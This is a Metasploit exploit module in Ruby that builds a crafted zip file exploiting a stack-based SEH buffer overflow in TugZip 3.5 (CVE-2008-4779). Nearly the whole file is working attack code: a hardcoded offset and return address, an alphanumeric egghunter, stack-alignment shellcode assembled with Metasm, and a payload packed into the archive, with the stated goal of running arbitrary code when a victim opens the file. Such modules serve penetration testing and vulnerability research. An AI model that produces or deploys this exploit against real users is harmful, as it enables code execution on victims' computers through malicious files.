##
# $Id: tugzip.rb 13868 2011-10-11 03:30:14Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TugZip 3.5 Zip File Parsing Buffer Overflow Vulnerability',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow vulnerability
				in the latest version 3.5 of TugZip archiving utility.
				In order to trigger the vulnerability, an attacker must convince someone
				to load a specially crafted zip file with TugZip by double click or file open.
				By doing so, an attacker can execute arbitrary code as the victim user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Stefan Marin', # Vulnerability discovery
					'Lincoln', # Corelan team. Original exploit
					'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module
					'mr_me <steventhomasseeley[at]gmail.com>',  # Metasploit module
				],
			'Version'        => '$Revision: 13868 $',
			'References'     =>
				[
					[ 'OSVDB', '49371' ],
					[ 'CVE', '2008-4779' ],
					[ 'BID', '17432' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/12008/' ]
				],
			'Platform'       => [ 'win' ],
			'Payload'        =>
				{
					'BadChars'      => "\x00\x0f\x14\x15\x2f" + (0x80..0xff).to_a.pack('C*'),
					'DisableNops'   => true, # no need
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EDI', # Egghunter jmp EDI
						}
				},

			'Targets'        =>
				[
					[
						'Universal',
						{
							'Ret'    => 0x7e0c307e,
							# 5.00.2147.1 [ztvcabinet.dll]
							# POP EBX > POP EBP > RETN
							'Offset' => 372, # to nseh
						}
					],
				],
			'DislosureDate' => 'Oct 28 2008',
			'DefaultTarget'  => 0))

			register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),
			], self.class)

	end

	def exploit

		# Hardcoded egghunter due to size limit (before nseh destroyed/130D past seh of usable bytes)
		# base register ESI
		hunter = "VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIK9Jzs"
		hunter << "rbrRJuRRxzmvNWLWuQJt4ZOnXPwtpTpQdLKJZLoPuzJNO3EXgkOJGA"
		eggtag = 'w00t' * 2

		getpc_asm = %q{
			popad
			popad
			popad
			popad
			popad
			pop ebx
		}

		# Align EBX for hunter
		alignment = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string

		# Align for ESI + factoring mangled chars
		alignment << "\x89\x05"              # jmp short (5 bytes) to 'jmp back' at end
		alignment << "\x5e"                  # pop esi
		alignment << "\x41"                  # nop (inc ecx)
		alignment << "\x98\x99"              # call esi
		alignment << "\x41"                  # nop (inc ecx)
		alignment << "\x8a\x94\x98\x98\x98"  # jmp back to pop esi

		getpc_asm = %q{
			popad
			pop esp
			inc eax
			inc eax
		}

		# Realign stack pointer
		nseh = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string

		seh = [target.ret].pack("V*")

		sploit = rand_text_alpha(target['Offset'])
		sploit << nseh << seh 
		sploit << alignment
		sploit << hunter
		sploit << eggtag << payload.encoded

		zip = Rex::Zip::Archive.new
		xtra = [0xdac0ffee].pack('V')
		comment = [0xbadc0ded].pack('V')
		zip.add_file(sploit, xtra, comment)

		# Create the file
		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(zip.pack)
	end

end